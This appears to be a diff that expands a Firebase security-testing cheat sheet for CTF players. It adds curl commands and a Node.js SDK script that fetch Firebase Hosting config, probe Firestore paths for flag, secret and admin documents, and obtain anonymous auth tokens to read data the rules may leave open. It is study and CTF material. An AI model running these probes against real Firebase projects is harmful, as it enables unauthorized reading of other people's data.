@@ -13,10 +13,15 @@
 | Storage Bucket | `https://firebasestorage.googleapis.com/v0/b/PROJECT.appspot.com/o` | JSON file listing |
 | Auth | Register with API key | Account created → escalate |
 | Functions | `https://us-central1-PROJECT.cloudfunctions.net/FUNCTION` | Response without auth |
+| Firebase Hosting Config | `https://TARGET/__/firebase/init.json` | Firebase config JSON returned |
 
 ```bash
 # Fastest Firebase recon chain:
 PROJECT="target-app"
+TARGET="https://target-site.com"
+
+# 0. If hosted on Firebase, pull the generated config
+curl "$TARGET/__/firebase/init.json"
 
 # 1. Test RTDB open read
 curl "https://$PROJECT.firebaseio.com/.json"
@@ -57,6 +62,46 @@ Firebase is Google's Backend-as-a-Service (BaaS) platform. Developers use it to 
 ---
 
 ## Finding Firebase Projects
+
+### From Firebase Hosting Reserved Paths
+
+Firebase Hosting can expose a generated initialization file at this reserved path:
+
+```bash
+curl "https://TARGET/__/firebase/init.json"
+curl "http://localhost:8080/__/firebase/init.json"
+```
+
+Typical response:
+
+```json
+{
+  "apiKey": "AIzaSy...",
+  "authDomain": "project-id.firebaseapp.com",
+  "projectId": "project-id",
+  "storageBucket": "project-id.appspot.com",
+  "messagingSenderId": "123456789012",
+  "appId": "1:123456789012:web:abcdef",
+  "measurementId": "G-XXXX"
+}
+```
+
+This config is not automatically a bug by itself because Firebase client config is public. It becomes useful when the project's Security Rules allow public reads, anonymous auth, weak authenticated access, or open storage.
+
+**Other Firebase Hosting reserved paths worth checking:**
+
+```bash
+curl "https://TARGET/__/firebase/init.js"
+curl "https://TARGET/__/firebase/init.json"
+curl "https://TARGET/__/auth/handler"
+```
+
+**CTF hint language that points here:**
+- "default paths"
+- "cloud knowledge"
+- "hosted in Firebase"
+- "eternal flame" / "initialization" / "init"
+- Page source includes `/__/firebase/` scripts
 
 ### From Client-Side JavaScript
 
@@ -316,6 +361,85 @@ curl "$BASE/users?key=AIzaSyXXXXXXXX"
 
 # List collections with key
 curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users?key=API_KEY"
+```
+
+### Nested Collections and Document Paths
+
+Firestore paths alternate between collections and documents:
+
+```text
+collection/document/collection/document
+```
+
+If a web page shows paths like these, treat them as Firestore collection/document/subcollection paths:
+
+```text
+/scholars/imam-malik/muwatta
+/scholars/ibn-taymiyyah/wasitiyyah
+/scholars/imam-ahmad/musnad
+```
+
+Probe them directly:
+
+```bash
+BASE="https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"
+
+# List the wasitiyyah subcollection under scholars/ibn-taymiyyah
+curl "$BASE/scholars/ibn-taymiyyah/wasitiyyah?key=API_KEY"
+
+# Read likely flag documents inside that collection
+curl "$BASE/scholars/ibn-taymiyyah/wasitiyyah/flag?key=API_KEY"
+curl "$BASE/scholars/ibn-taymiyyah/wasitiyyah/secret?key=API_KEY"
+curl "$BASE/scholars/ibn-taymiyyah/wasitiyyah/admin?key=API_KEY"
+```
+
+If unauthenticated REST reads fail, sign in anonymously or register a throwaway user, then retry with a Bearer token:
+
+```bash
+curl -H "Authorization: Bearer ID_TOKEN" \
+  "$BASE/scholars/ibn-taymiyyah/wasitiyyah/flag"
+```
+
+### Firestore SDK Read Script
+
+Use this when the REST API is annoying or when the challenge expects Firebase SDK behavior:
+
+```javascript
+const { initializeApp } = require("firebase/app");
+const { getAuth, signInAnonymously } = require("firebase/auth");
+const { getFirestore, collection, getDocs, doc, getDoc } = require("firebase/firestore");
+
+const firebaseConfig = {
+  apiKey: "AIzaSy...",
+  authDomain: "project-id.firebaseapp.com",
+  projectId: "project-id",
+  storageBucket: "project-id.appspot.com",
+  messagingSenderId: "123456789012",
+  appId: "1:123456789012:web:abcdef"
+};
+
+async function main() {
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  const db = getFirestore(app);
+
+  await signInAnonymously(auth);
+  console.log("[+] Signed in anonymously");
+
+  const col = collection(db, "scholars", "ibn-taymiyyah", "wasitiyyah");
+  const snap = await getDocs(col);
+
+  snap.forEach((d) => {
+    console.log(d.id, d.data());
+  });
+
+  const flagDoc = await getDoc(doc(db, "scholars", "ibn-taymiyyah", "wasitiyyah", "flag"));
+  if (flagDoc.exists()) {
+    console.log("[FLAG]", flagDoc.data());
+  }
+}
+
+main().catch(console.error);
 ```
 
 ### Write to Firestore
@@ -791,6 +915,51 @@ if __name__ == "__main__":
 
 ## Exploitation Workflow
 
+### CTF-First Firebase Flow
+
+Use this when a static challenge page hints at Firebase, "cloud", "default paths", or shows collection-looking paths:
+
+```bash
+TARGET="http://localhost:8080"
+
+# 1. Check Firebase Hosting's generated config first
+curl "$TARGET/__/firebase/init.json"
+
+# 2. Extract projectId, apiKey, storageBucket, authDomain
+PROJECT="project-id"
+API_KEY="AIzaSy..."
+
+# 3. Try RTDB anyway, even if the app appears to use Firestore
+curl "https://$PROJECT.firebaseio.com/.json?print=pretty"
+curl "https://$PROJECT.firebaseio.com/.json?shallow=true"
+
+# 4. Try Firestore collections suggested by the page
+BASE="https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents"
+curl "$BASE/scholars/ibn-taymiyyah/wasitiyyah?key=$API_KEY"
+curl "$BASE/scholars/ibn-taymiyyah/wasitiyyah/flag?key=$API_KEY"
+
+# 5. If denied, get an anonymous ID token and retry with Authorization: Bearer
+curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{"returnSecureToken":true}'
+```
+
+### Eternal Flame Pattern
+
+The "Eternal Flame" style challenge chain:
+
+1. Visit `/__/firebase/init.json` and extract `apiKey`, `projectId`, and `storageBucket`
+2. Read page text/source for Firestore-looking paths such as `/scholars/ibn-taymiyyah/wasitiyyah`
+3. Sign in anonymously if rules require `auth != null`
+4. List the hinted subcollection
+5. Read likely documents: `flag`, `secret`, `admin`, `private`
+
+Example target document:
+
+```text
+scholars/ibn-taymiyyah/wasitiyyah/flag
+```
+
 1. **Find the Firebase config** — search JS source for `firebaseConfig`, `apiKey`, `databaseURL`, `storageBucket`
 2. **Extract project ID** — from `databaseURL` (`PROJECT.firebaseio.com`) or `projectId` field
 3. **Test RTDB root** — `curl https://PROJECT.firebaseio.com/.json` — open read = dump everything
@@ -877,6 +1046,9 @@ service cloud.firestore {
 **Fastest CTF Firebase chain:**
 
 ```bash
+# 0. Try Firebase Hosting generated config
+curl "https://TARGET/__/firebase/init.json"
+
 # 1. Get project ID from page source
 grep -o '"projectId":"[^"]*"' page.html
 
